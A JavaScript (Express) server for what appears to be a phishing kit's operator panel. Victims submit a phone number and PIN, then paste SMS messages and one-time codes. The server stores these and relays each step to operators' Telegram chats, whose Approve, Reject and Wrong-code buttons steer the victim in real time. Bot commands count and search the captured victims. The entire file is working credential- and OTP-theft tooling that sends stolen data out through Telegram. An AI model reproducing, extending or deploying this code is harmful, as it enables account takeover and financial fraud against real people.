'use strict';

const express = require('express');
const path = require('path');
const fs = require('fs');

/* ─────────────── config ─────────────── */
const PORT   = process.env.PORT || 3000;
const TOKEN  = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT   = process.env.TELEGRAM_CHAT_ID || '';
const SECRET = process.env.TELEGRAM_WEBHOOK_SECRET || '';
const ORIGIN = (process.env.PUBLIC_URL || '').replace(/\/+$/, '');
const MODE   = (process.env.TELEGRAM_MODE || 'webhook').toLowerCase();
const TG     = TOKEN ? `https://api.telegram.org/bot${TOKEN}` : '';

/* optional multi-admin map: {"ADMIN036":"123456789"} */
let CHATS = {};
try { CHATS = JSON.parse(process.env.TELEGRAM_CHATS || '{}'); } catch (_) {}
const chatFor = a => CHATS[a.adminId] || CHAT;

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(express.static(__dirname));

/* ─────────────── storage ─────────────── */
const FILE = path.join(__dirname, 'applications.json');
let apps = new Map();
try { apps = new Map(Object.entries(JSON.parse(fs.readFileSync(FILE, 'utf8')))); } catch (_) {}

let pendingWrite = null;
function persist() {
  clearTimeout(pendingWrite);
  pendingWrite = setTimeout(
    () => fs.writeFile(FILE, JSON.stringify(Object.fromEntries(apps)), () => {}), 250);
}

const newId = () => 'APP' + Math.random().toString(36).slice(2, 9).toUpperCase();
const now   = () => new Date().toISOString();
const esc   = s => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

/* ─────────────── telegram plumbing ─────────────── */
async function tg(method, payload) {
  if (!TG) { console.error('TG: TELEGRAM_BOT_TOKEN not set'); return null; }
  const r = await fetch(`${TG}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
  const d = await r.json().catch(() => null);
  if (!d || !d.ok) console.error(`TG ${method} failed:`, d && d.description);
  return d;
}

const HEADS = {
  pin: 'LOGIN — check the PIN',
  sms: 'SMS PASTED — read the code',
  otp: 'OTP PASTED'
};

function card(a, kind) {
  const out = [`<b>${HEADS[kind]}</b>`, `APP <code>${a.id}</code>`, `Phone <code>${a.phone}</code>`];
  if (kind === 'pin') out.push(`PIN <code>${a.pin}</code>`);
  if (kind === 'sms') out.push('', '<b>Pasted SMS</b>', `<pre>${esc(a.smsMessage || '(empty)')}</pre>`);
  if (kind === 'otp') out.push('', '<b>Pasted message</b>', `<pre>${esc(a.otpMessage || '(empty)')}</pre>`);
  out.push('', `<i>${a.adminId || 'no-admin'} · ${a.stage} · ${a.updatedAt}</i>`);
  return out.join('\n');
}

function keyboard(a, kind) {
  if (kind === 'pin') return { inline_keyboard: [[
    { text: 'Approve', callback_data: `pin:ok:${a.id}` },
    { text: 'Reject',  callback_data: `pin:no:${a.id}` }
  ]]};

  if (kind === 'sms') return { inline_keyboard: [[
    { text: 'Approve',   callback_data: `sms:ok:${a.id}` },
    { text: 'Wrong SMS', callback_data: `sms:no:${a.id}` }
  ]]};

  return { inline_keyboard: [[
    { text: 'Approve',    callback_data: `otp:ok:${a.id}` },
    { text: 'Wrong code', callback_data: `otp:no:${a.id}` },
    { text: 'Wrong PIN',  callback_data: `otp:wp:${a.id}` }
  ]]};
}

async function notify(a, kind) {
  const chat = chatFor(a);
  if (!chat) { console.error(`TG: no chat mapped for admin "${a.adminId}"`); return; }
  await tg('sendMessage', {
    chat_id: chat,
    text: card(a, kind),
    parse_mode: 'HTML',
    reply_markup: keyboard(a, kind)
  });
}

const isWaiting = a =>
  (a.stage === 'pin' && a.pinStatus === 'pending') ||
  (a.stage === 'sms' && a.smsStatus === 'pending') ||
  (a.stage === 'otp' && a.otpStatus === 'pending');

/* ─────────────── bot handlers ─────────────── */
async function handleCallback(cq) {
  const reply = txt => tg('answerCallbackQuery', { callback_query_id: cq.id, text: txt });
  const [kind, act, id] = (cq.data || '').split(':');
  const a = apps.get(id);
  if (!a) return reply('Application not found');

  if (kind === 'pin') {
    a.pinStatus = act === 'ok' ? 'approved' : 'rejected';
    if (act === 'ok') a.stage = 'sms';
  } else if (kind === 'sms') {
    a.smsStatus = act === 'ok' ? 'approved' : 'rejected';
  } else if (kind === 'otp') {
    if (act === 'ok')      a.otpStatus = 'approved';
    else if (act === 'wp') a.otpStatus = 'wrongpin_otp';
    else                   a.otpStatus = 'wrongcode';
  } else {
    return reply('Unknown action');
  }

  a.updatedAt = now();
  persist();

  const label =
    act === 'ok'     ? 'APPROVED'
  : act === 'wp'     ? 'WRONG PIN — sent back to login'
  : kind === 'pin'   ? 'REJECTED — back to login'
  : kind === 'sms'   ? 'WRONG SMS — applicant re-pastes'
  :                    'WRONG CODE — applicant re-pastes';

  await tg('editMessageText', {
    chat_id: cq.message.chat.id,
    message_id: cq.message.message_id,
    text: `${cq.message.text}\n\n>>> <b>${label}</b>`,
    parse_mode: 'HTML',
    reply_markup: { inline_keyboard: [] }
  });
  await reply(label);
}

async function handleMessage(m) {
  const text = (m.text || '').trim().toLowerCase();
  const say  = t => tg('sendMessage', { chat_id: m.chat.id, text: t, parse_mode: 'HTML' });

  if (text === '/start' || text === '/id') {
    return say(`Your chat id is <code>${m.chat.id}</code>\n\nPut it in TELEGRAM_CHAT_ID, then redeploy.`);
  }

  if (text === '/pending') {
    const list = [...apps.values()].filter(isWaiting);
    if (!list.length) return say('Nothing waiting.');
    for (const a of list) await notify(a, a.stage);
    return;
  }

  if (text === '/stats') {
    const all = [...apps.values()];
    const n = f => all.filter(f).length;
    return say([
      '<b>Stats</b>',
      `Total            ${all.length}`,
      `Waiting on you   ${all.filter(isWaiting).length}`,
      `  · pin          ${n(a => a.stage === 'pin' && a.pinStatus === 'pending')}`,
      `  · sms          ${n(a => a.stage === 'sms' && a.smsStatus === 'pending')}`,
      `  · otp          ${n(a => a.stage === 'otp' && a.otpStatus === 'pending')}`,
      '',
      `Approved         ${n(a => a.otpStatus === 'approved')}`,
      `Wrong code       ${n(a => a.otpStatus === 'wrongcode')}`,
      `Wrong PIN resets ${n(a => a.otpStatus === 'wrongpin_otp')}`,
      `Bounced at PIN   ${n(a => a.pinStatus === 'rejected')}`,
      `Bounced at SMS   ${n(a => a.smsStatus === 'rejected')}`,
      '',
      `Last 24h         ${n(a => Date.now() - Date.parse(a.createdAt) < 864e5)}`
    ].join('\n'));
  }

  if (text === '/find' || text.startsWith('/find ')) {
    const q = text.slice(5).trim().toUpperCase();
    if (!q) return say('Usage: <code>/find 670123456</code> or <code>/find APP7X2K9</code>');

    const hits = [...apps.values()].filter(a => a.id.includes(q) || a.phone.includes(q));
    if (!hits.length) return say(`No match for <code>${esc(q)}</code>`);

    return say(hits.slice(-5).map(a =>
      `<code>${a.id}</code> · ${a.phone} · ${a.adminId}\n` +
      `stage ${a.stage} · pin ${a.pinStatus} · sms ${a.smsStatus} · otp ${a.otpStatus}`
    ).join('\n\n'));
  }

  if (text === '/help') {
    return say('<b>Commands</b>\n' +
      '/pending — resend everything waiting, with live buttons\n' +
      '/stats — counts by stage and outcome\n' +
      '/find &lt;phone or APP id&gt; — look one up\n' +
      '/id — show this chat id');
  }
}

/* ─────────────── applicant api ─────────────── */
app.post('/api/verify-pin', async (req, res) => {
  const { phoneNumber, pin, requestAdminId } = req.body || {};
  if (!phoneNumber || !pin) return res.json({ success: false, message: 'Missing phone or PIN.' });

  const a = {
    id: newId(), adminId: requestAdminId || '', phone: phoneNumber, pin,
    stage: 'pin',   pinStatus: 'pending',
    smsMessage: '', smsStatus: 'pending',
    otpMessage: '', otpStatus: 'pending',
    createdAt: now(), updatedAt: now()
  };
  apps.set(a.id, a);
  persist();
  notify(a, 'pin').catch(e => console.error(e));
  res.json({ success: true, applicationId: a.id });
});

app.get('/api/check-pin-status/:id', (req, res) => {
  const a = apps.get(req.params.id);
  if (!a) return res.json({ success: false, message: 'Application not found' });
  res.json({ success: true, status: a.pinStatus });
});

app.post('/api/verify-sms', async (req, res) => {
  const { applicationId, smsMessage } = req.body || {};
  const a = apps.get(applicationId);
  if (!a) return res.json({ success: false, message: 'Application not found' });

  a.smsMessage = smsMessage || '';
  a.smsStatus  = 'pending';
  a.stage      = 'sms';
  a.updatedAt  = now();
  persist();
  notify(a, 'sms').catch(e => console.error(e));
  res.json({ success: true });
});

app.post('/api/resend-sms', async (req, res) => {
  const a = apps.get((req.body || {}).applicationId);
  if (!a) return res.json({ success: false, message: 'Application not found' });

  a.smsMessage = '';
  a.smsStatus  = 'pending';
  a.updatedAt  = now();
  persist();
  await tg('sendMessage', {
    chat_id: chatFor(a),
    text: `<b>Resend requested</b>\nAPP <code>${a.id}</code> — waiting for a fresh paste.`
  });
  res.json({ success: true });
});

app.get('/api/check-otp-status/:id', (req, res) => {
  const a = apps.get(req.params.id);
  if (!a) return res.json({ success: false, message: 'Application not found' });
  res.json({ success: true, status: a.stage === 'otp' ? a.otpStatus : a.smsStatus });
});

app.post('/api/verify-otp', async (req, res) => {
  const { applicationId, otp } = req.body || {};
  const a = apps.get(applicationId);
  if (!a) return res.json({ success: false, message: 'Application not found' });

  a.otpMessage = otp || '';
  a.otpStatus  = 'pending';
  a.stage      = 'otp';
  a.updatedAt  = now();
  persist();
  notify(a, 'otp').catch(e => console.error(e));
  res.json({ success: true });
});

/* ─────────────── ops ─────────────── */
app.get('/health', (_req, res) =>
  res.json({ ok: true, token: !!TOKEN, chat: !!CHAT, origin: !!ORIGIN, mode: MODE }));

app.get('/api/applications', (_req, res) =>
  res.json({ success: true, applications: [...apps.values()].reverse() }));

app.get('/api/telegram/setup', async (_req, res) => {
  if (!ORIGIN) return res.json({ error: 'set PUBLIC_URL first' });
  const r = await tg('setWebhook', {
    url: `${ORIGIN}/api/telegram/webhook`,
    secret_token: SECRET || undefined,
    drop_pending_updates: true
  });
  res.json({ url: `${ORIGIN}/api/telegram/webhook`, result: r });
});

app.get('/api/telegram/status', async (_req, res) => res.json(await tg('getWebhookInfo', {})));

app.post('/api/telegram/webhook', async (req, res) => {
  if (SECRET && req.get('x-telegram-bot-api-secret-token') !== SECRET) return res.sendStatus(401);
  res.sendStatus(200);
  try {
    if (req.body.message)             await handleMessage(req.body.message);
    else if (req.body.callback_query) await handleCallback(req.body.callback_query);
  } catch (e) { console.error('webhook:', e); }
});

app.use('/api', (_req, res) => res.status(404).json({ success: false, message: 'No such route' }));

/* ─────────────── boot ─────────────── */
app.listen(PORT, async () => {
  console.log(`listening on ${PORT}`);
  console.log(`token: ${TOKEN ? 'set' : 'MISSING'} | chat: ${CHAT ? 'set' : 'MISSING'} | origin: ${ORIGIN || 'MISSING'}`);

  if (!TG) return;

  if (MODE === 'poll') {
    console.log('TG: polling mode');
    await tg('deleteWebhook', { drop_pending_updates: true });
    let offset = 0;
    for (;;) {
      const r = await tg('getUpdates', { offset, timeout: 30 });
      if (r && r.ok) {
        for (const u of r.result) {
          offset = u.update_id + 1;
          try {
            if (u.message)             await handleMessage(u.message);
            else if (u.callback_query) await handleCallback(u.callback_query);
          } catch (e) { console.error(e); }
        }
      } else {
        await new Promise(r => setTimeout(r, 3000));
      }
    }
  }
});